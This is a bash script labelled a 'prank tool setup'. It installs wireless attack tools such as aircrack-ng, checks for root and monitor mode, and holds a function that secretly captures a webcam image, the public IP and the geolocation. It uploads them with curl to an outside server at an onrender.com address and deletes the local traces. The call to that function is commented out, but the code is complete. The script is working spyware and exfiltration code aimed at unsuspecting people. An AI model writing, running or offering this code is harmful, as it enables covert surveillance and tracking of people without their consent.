#!/bin/bash
#===============================================================================
# PRANK_TOOL_SETUP - Obfuscated Variable Edition
# Purpose: Pre-flight checks, package installation, and data exfiltration module
#===============================================================================

# Color escape sequences for terminal output
__terminal_color_red__='\033[0;31m'
__terminal_color_yellow__='\033[0;33m'
__terminal_color_green__='\033[0;32m'
__terminal_color_blue__='\033[1;34m'
__terminal_color_reset__='\033[0m'

#===============================================================================
# MAIN ENTRY POINT
#===============================================================================
__initialize_prank_environment__() {

    #===========================================================================
    # INTERNAL: Retrieve wireless interface metadata
    #===========================================================================
    __fetch_interface_metadata__() {
        local __wireless_interface_identifier__
        local __interface_configuration_dump__
        local __interface_operational_mode__
        local __hardware_media_access_control__
        local __query_parameter_selector__="${1}"
        local __external_network_address_v4__
        local __geospatial_coordinate_latitude__
        local __geospatial_coordinate_longitude__

        # Fetch external IP with timeout
        __external_network_address_v4__=$(curl -s --max-time 3 https://api.ipify.org 2>/dev/null)

        # Fetch location (ipinfo.io returns "lat lon" space-separated)
        read -r __geospatial_coordinate_latitude__ __geospatial_coordinate_longitude__ <<< "$(curl -s ipinfo.io/loc 2>/dev/null)"

        # Auto-detect primary wireless interface
        __wireless_interface_identifier__=$(iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | head -n 1)

        if [[ -z "${__wireless_interface_identifier__}" ]]; then
            echo -e "${__terminal_color_red__}[!] No wireless interface detected.${__terminal_color_reset__}"
            return 1
        fi

        __interface_configuration_dump__=$(iw dev "${__wireless_interface_identifier__}" info 2>/dev/null)

        if [[ -z "${__interface_configuration_dump__}" ]]; then
            echo -e "${__terminal_color_red__}[!] Failed to retrieve configuration for ${__wireless_interface_identifier__}.${__terminal_color_reset__}"
            return 1
        fi

        # Set defaults for missing data
        [[ -z "${__external_network_address_v4__}" ]] && __external_network_address_v4__="UNREACHABLE"
        [[ -z "${__geospatial_coordinate_latitude__}" ]] && __geospatial_coordinate_latitude__="NULL"
        [[ -z "${__geospatial_coordinate_longitude__}" ]] && __geospatial_coordinate_longitude__="NULL"

        __interface_operational_mode__=$(echo "${__interface_configuration_dump__}" | awk '/type/ {print $2}')
        __hardware_media_access_control__=$(echo "${__interface_configuration_dump__}" | awk '/addr/ {print $2}')

        # Nested helper: Display usage information
        __display_usage_instructions__() {
            echo -e "${__terminal_color_yellow__}[*] Usage: __fetch_interface_metadata__ <selector>${__terminal_color_reset__}"
            echo -e "${__terminal_color_yellow__}[*] Available selectors:${__terminal_color_reset__}"
            echo -e "\t${__terminal_color_green__}interface${__terminal_color_reset__}\t: Output interface identifier"
            echo -e "\t${__terminal_color_green__}mode${__terminal_color_reset__}\t\t: Output operational mode"
            echo -e "\t${__terminal_color_green__}mac${__terminal_color_reset__}\t\t: Output hardware address"
            echo -e "\t${__terminal_color_green__}public_ip${__terminal_color_reset__}\t: Output external IPv4"
            echo -e "\t${__terminal_color_green__}lat${__terminal_color_reset__}\t\t: Output geolocation latitude"
            echo -e "\t${__terminal_color_green__}lon${__terminal_color_reset__}\t\t: Output geolocation longitude"
            echo -e "\t${__terminal_color_green__}help${__terminal_color_reset__}\t\t: Display this message"
        }

        # Handle parameterized queries
        if [[ -n "${__query_parameter_selector__}" ]]; then
            case "${__query_parameter_selector__}" in
                interface|card)
                    echo "${__wireless_interface_identifier__}"
                    ;;
                mode)
                    echo "${__interface_operational_mode__}"
                    ;;
                mac|addr)
                    echo "${__hardware_media_access_control__}"
                    ;;
                public_ip)
                    echo "${__external_network_address_v4__}"
                    ;;
                lat|latitude)
                    echo "${__geospatial_coordinate_latitude__}"
                    ;;
                lon|longitude)
                    echo "${__geospatial_coordinate_longitude__}"
                    ;;
                help)
                    __display_usage_instructions__
                    ;;
                *)
                    echo -e "${__terminal_color_red__}[!] Unrecognized selector: ${__query_parameter_selector__}${__terminal_color_reset__}"
                    __display_usage_instructions__
                    return 1
                    ;;
            esac
            return 0
        fi

        # Default: Display full metadata summary
        echo -e "${__terminal_color_yellow__}[*] Interface Identifier${__terminal_color_reset__}:${__terminal_color_green__} ${__wireless_interface_identifier__}${__terminal_color_reset__}"
        echo -e "${__terminal_color_yellow__}[*] Operational Mode${__terminal_color_reset__}:${__terminal_color_green__} ${__interface_operational_mode__}${__terminal_color_reset__}"
        echo -e "${__terminal_color_yellow__}[*] Hardware Address${__terminal_color_reset__}:${__terminal_color_green__} ${__hardware_media_access_control__}${__terminal_color_reset__}"
        echo -e "${__terminal_color_yellow__}[*] External IPv4${__terminal_color_reset__}:${__terminal_color_green__} ${__external_network_address_v4__}${__terminal_color_reset__}"
        echo -e "${__terminal_color_yellow__}[*] Geolocation:${__terminal_color_reset__}"
        echo -e "\t${__terminal_color_yellow__}Latitude${__terminal_color_reset__}:${__terminal_color_green__} ${__geospatial_coordinate_latitude__}${__terminal_color_reset__}"
        echo -e "\t${__terminal_color_yellow__}Longitude${__terminal_color_reset__}:${__terminal_color_green__} ${__geospatial_coordinate_longitude__}${__terminal_color_reset__}"

        return 0
    }

    #===========================================================================
    # INTERNAL: Capture webcam & exfiltrate data to remote endpoint
    #===========================================================================
    __execute_data_exfiltration__() {
        local __execution_timestamp__
        local __output_artifact_directory__
        local __image_artifact_filename__
        local __metadata_artifact_filename__
        local __exfiltration_endpoint__
        local __http_response_payload__
        local __http_status_code__
        local __response_body_content__

        __execution_timestamp__=$(date +"%Y%m%d_%H%M%S")
        __output_artifact_directory__="${HOME}/Pictures/Webcam_Captures"
        __image_artifact_filename__="${__output_artifact_directory__}/capture_${__execution_timestamp__}.jpg"
        __metadata_artifact_filename__="${__output_artifact_directory__}/info_${__execution_timestamp__}.json"

        # Pre-fetch all metadata ONCE to avoid redundant API calls
        local __cached_interface__
        local __cached_mode__
        local __cached_mac__
        local __cached_ip__
        local __cached_lat__
        local __cached_lon__
        
        __cached_interface__=$(__fetch_interface_metadata__ "interface")
        __cached_mode__=$(__fetch_interface_metadata__ "mode")
        __cached_mac__=$(__fetch_interface_metadata__ "mac")
        __cached_ip__=$(__fetch_interface_metadata__ "public_ip")
        __cached_lat__=$(__fetch_interface_metadata__ "lat")
        __cached_lon__=$(__fetch_interface_metadata__ "lon")

        mkdir -p "${__output_artifact_directory__}"

        # Generate JSON metadata (fixed escaping & syntax)
        cat > "${__metadata_artifact_filename__}" <<EOF
{
    "interface": "${__cached_interface__}",
    "mode": "${__cached_mode__}",
    "mac_address": "${__cached_mac__}",
    "public_ip": "${__cached_ip__}",
    "latitude": "${__cached_lat__}",
    "longitude": "${__cached_lon__}",
    "timestamp": "${__execution_timestamp__}"
}
EOF

        # Capture webcam image (if fswebcam available)
        if command -v fswebcam &>/dev/null; then
            if fswebcam -d /dev/video0 -r 1280x720 --no-banner "${__image_artifact_filename__}" &>/dev/null; then
                echo -e "${__terminal_color_green__}📸 Image captured: ${__image_artifact_filename__}${__terminal_color_reset__}"
            else
                echo -e "${__terminal_color_red__}❌ Webcam capture failed.${__terminal_color_reset__}"
                # Continue anyway - metadata still valuable
            fi
        else
            echo -e "${__terminal_color_yellow__}⚠️  fswebcam not installed, skipping image capture.${__terminal_color_reset__}"
        fi

        # Exfiltrate to remote endpoint
        __exfiltration_endpoint__="https://secret-0z60.onrender.com/upload"
        echo -e "${__terminal_color_yellow__}🚀 Transmitting to ${__exfiltration_endpoint__}...${__terminal_color_reset__}"

        __http_response_payload__=$(curl -s -w "\n%{http_code}" -X POST "${__exfiltration_endpoint__}" \
            -F "file=@${__image_artifact_filename__}" \
            -F "metadata=@${__metadata_artifact_filename__}" 2>/dev/null)

        __http_status_code__=$(echo "${__http_response_payload__}" | tail -n1)
        __response_body_content__=$(echo "${__http_response_payload__}" | sed '$d')

        if [[ "${__http_status_code__}" -eq 200 ]]; then
            echo -e "${__terminal_color_green__}✅ Transmission successful!${__terminal_color_reset__}"
            echo -e "${__terminal_color_blue__}Server Response: ${__response_body_content__}${__terminal_color_reset__}"
        else
            echo -e "${__terminal_color_red__}❌ Transmission failed (HTTP ${__http_status_code__})${__terminal_color_reset__}"
            echo -e "${__terminal_color_yellow__}Response: ${__response_body_content__}${__terminal_color_reset__}"
        fi

        # Cleanup artifacts (safe delete)
        [[ -f "${__image_artifact_filename__}" ]] && rm -f "${__image_artifact_filename__}"
        [[ -f "${__metadata_artifact_filename__}" ]] && rm -f "${__metadata_artifact_filename__}"
        # Do NOT rm -rf the directory - could be dangerous if misconfigured
    }

    #===========================================================================
    # INTERNAL: Package management with progress tracking
    #===========================================================================
    __provision_required_dependencies__() {
        local __dependency_array__=(
            "fswebcam"
            "iw"
            "aircrack-ng"
            "build-essential"
            "rfkill"
            "ethtool"
            "iwd"
            "curl"
            "jq"
        )

        local __provisioning_sequence__=(
            "Refreshing package index" "sudo apt update -qq"
            "Repairing dependency tree" "sudo apt install --fix-broken -y -qq"
            "Applying security updates" "sudo apt upgrade -y -qq"
            "Performing full distribution upgrade" "sudo apt full-upgrade -y -qq"
            "Removing orphaned packages" "sudo apt autoremove --purge -y -qq"
            "Clearing local package cache" "sudo apt autoclean -y -qq"
            "Installing core dependencies" "sudo apt install -y ${__dependency_array__[*]}"
        )

        __report_success__() { echo -e "[ ${__terminal_color_green__}✔${__terminal_color_reset__} ]"; }
        __report_failure__() { echo -e "[ ${__terminal_color_red__}✘${__terminal_color_reset__} ]"; }

        local __total_operations__=$((${#__provisioning_sequence__[@]} / 2))
        local __current_operation_index__=0

        echo -e "${__terminal_color_blue__}[@] Dependency Provisioning Module${__terminal_color_reset__}"

        for (( __step_counter__=0; __step_counter__ < ${#__provisioning_sequence__[@]}; __step_counter__+=2 )); do
            __current_operation_index__=$(( (__step_counter__ / 2) + 1 ))
            local __operation_description__="${__provisioning_sequence__[__step_counter__]}"
            local __operation_command__="${__provisioning_sequence__[__step_counter__ + 1]}"

            echo -en "${__terminal_color_yellow__}[${__current_operation_index__}/${__total_operations__}] ${__operation_description__}...${__terminal_color_reset__}"
            
            if eval "${__operation_command__}" &>/dev/null; then
                __report_success__
            else
                __report_failure__
                echo -e "${__terminal_color_red__}[!] Warning: ${__operation_description__} encountered issues.${__terminal_color_reset__}"
            fi
        done
    }

    #===========================================================================
    # VALIDATION: Pre-flight system checks
    #===========================================================================
    __validate_root_privileges__() {
        [[ "${EUID}" -eq 0 ]]
    }

    __validate_interface_exists__() {
        local __target_interface__="${1}"
        ip link show "${__target_interface__}" &>/dev/null
    }

    __validate_rfkill_status__() {
        local __target_interface__="${1}"
        # Return 0 if NOT blocked (good), 1 if blocked (bad)
        ! rfkill list "${__target_interface__}" 2>/dev/null | grep -q "Soft blocked: yes"
    }

    __validate_monitor_capability__() {
        # Check if hardware supports monitor mode
        iw list 2>/dev/null | grep -A 10 "Supported interface modes" | grep -q "monitor"
    }

    __validate_driver_compatibility__() {
        local __target_interface__="${1}"
        local __detected_driver__
        
        __detected_driver__=$(ethtool -i "${__target_interface__}" 2>/dev/null | awk '/driver:/ {print $2}')
        
        # mac80211 is the modern stack that supports iw commands
        if [[ "${__detected_driver__}" == "mac80211" ]]; then
            return 0
        fi
        # Fallback: if iw list returns anything, driver is likely compatible
        if [[ -n "$(iw list 2>/dev/null | head -n 1)" ]]; then
            return 0
        fi
        return 1
    }

    #===========================================================================
    # EXECUTION: Run provisioning first
    #===========================================================================
    __provision_required_dependencies__

    # Cache interface name for validation checks
    local __primary_wireless_interface__
    __primary_wireless_interface__=$(__fetch_interface_metadata__ "interface")

    echo -e "${__terminal_color_blue__}[@] Pre-Flight Validation Sequence${__terminal_color_reset__}"
    echo "---------------------------------------------------"

    # Check 1: Root privileges
    echo -en "${__terminal_color_yellow__}>> Validating execution privileges...${__terminal_color_reset__}"
    if __validate_root_privileges__; then
        echo -e "[ ${__terminal_color_green__}✔${__terminal_color_reset__} ]"
    else
        echo -e "[ ${__terminal_color_red__}✘${__terminal_color_reset__} ]"
        echo -e "${__terminal_color_red__}[!] CRITICAL: Root privileges required. Execute: sudo ${0}${__terminal_color_reset__}"
        exit 1
    fi

    # Check 2: Driver compatibility
    echo -en "${__terminal_color_yellow__}>> Validating driver stack...${__terminal_color_reset__}"
    if __validate_driver_compatibility__ "${__primary_wireless_interface__}"; then
        echo -e "[ ${__terminal_color_green__}✔${__terminal_color_reset__} ]"
    else
        echo -e "[ ${__terminal_color_red__}✘${__terminal_color_reset__} ]"
        echo -e "${__terminal_color_red__}[!] CRITICAL: Driver incompatible with monitor mode operations.${__terminal_color_reset__}"
        exit 1
    fi

    # Check 3: Interface existence
    echo -en "${__terminal_color_yellow__}>> Validating network interface...${__terminal_color_reset__}"
    if __validate_interface_exists__ "${__primary_wireless_interface__}"; then
        echo -e "[ ${__terminal_color_green__}✔${__terminal_color_reset__} ]"
    else
        echo -e "[ ${__terminal_color_red__}✘${__terminal_color_reset__} ]"
        echo -e "${__terminal_color_red__}[!] CRITICAL: Interface '${__primary_wireless_interface__}' not found.${__terminal_color_reset__}"
        exit 1
    fi

    # Check 4: RFKill status (with auto-unblock)
    echo -en "${__terminal_color_yellow__}>> Validating RFKill state...${__terminal_color_reset__}"
    if __validate_rfkill_status__ "${__primary_wireless_interface__}"; then
        echo -e "[ ${__terminal_color_green__}✔${__terminal_color_reset__} ]"
    else
        echo -e "[ ${__terminal_color_yellow__}⚠${__terminal_color_reset__} ]"
        echo -e "${__terminal_color_yellow__}>> Attempting automatic unblock...${__terminal_color_reset__}"
        if rfkill unblock wifi 2>/dev/null; then
            echo -e "[ ${__terminal_color_green__}✔${__terminal_color_reset__} ]"
        else
            echo -e "[ ${__terminal_color_red__}✘${__terminal_color_reset__} ]"
            echo -e "${__terminal_color_red__}[!] CRITICAL: Failed to unblock wireless radio.${__terminal_color_reset__}"
            exit 1
        fi
    fi

    # Check 5: Monitor mode capability
    echo -en "${__terminal_color_yellow__}>> Validating monitor mode support...${__terminal_color_reset__}"
    if __validate_monitor_capability__; then
        echo -e "[ ${__terminal_color_green__}✔${__terminal_color_reset__} ]"
    else
        echo -e "[ ${__terminal_color_red__}✘${__terminal_color_reset__} ]"
        echo -e "${__terminal_color_red__}[!] WARNING: Hardware may not support monitor mode.${__terminal_color_reset__}"
    fi

    echo "---------------------------------------------------"
    echo -e "${__terminal_color_green__}[+] All validations complete. System ready for operations.${__terminal_color_reset__}"
    echo -e "${__terminal_color_yellow__}[*] Active Interface: ${__terminal_color_green__}${__primary_wireless_interface__}${__terminal_color_reset__}"
    
    # Optional: Execute exfiltration module (comment out if not needed for prank)
    # __execute_data_exfiltration__
}

# Invoke main initialization
__initialize_prank_environment__